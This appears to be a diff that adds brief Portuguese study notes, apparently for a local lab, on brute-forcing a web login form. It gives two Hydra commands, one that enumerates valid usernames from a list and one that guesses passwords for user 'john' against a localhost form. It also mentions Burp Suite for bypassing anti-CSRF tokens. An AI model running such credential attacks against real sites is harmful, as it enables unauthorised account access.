@@ -1,0 +1,14 @@
+hydra
+    
+
+//Testar usuários da lista users.txt com a senha qualquer senha para identificar se o usuário é existente
+
+    hydra -V -L users.txt -p qualquer_senha "localhost" http-form-post "/bruteforce1/index.php:username=^USER^&password=^PASS^:S=Senha incorreta" 
+
+
+//Testar senhas da lista passwords.txt com usuários encontrados.
+
+    hydra -t 1 -V -l john -P passwords.txt "localhost" http-form-post "/bruteforce1/index.php:username=^USER^&password=^PASS^:Senha Incorreta"
+
+
+BurpSuite --> Utilizado para força bruta com token anti csrf
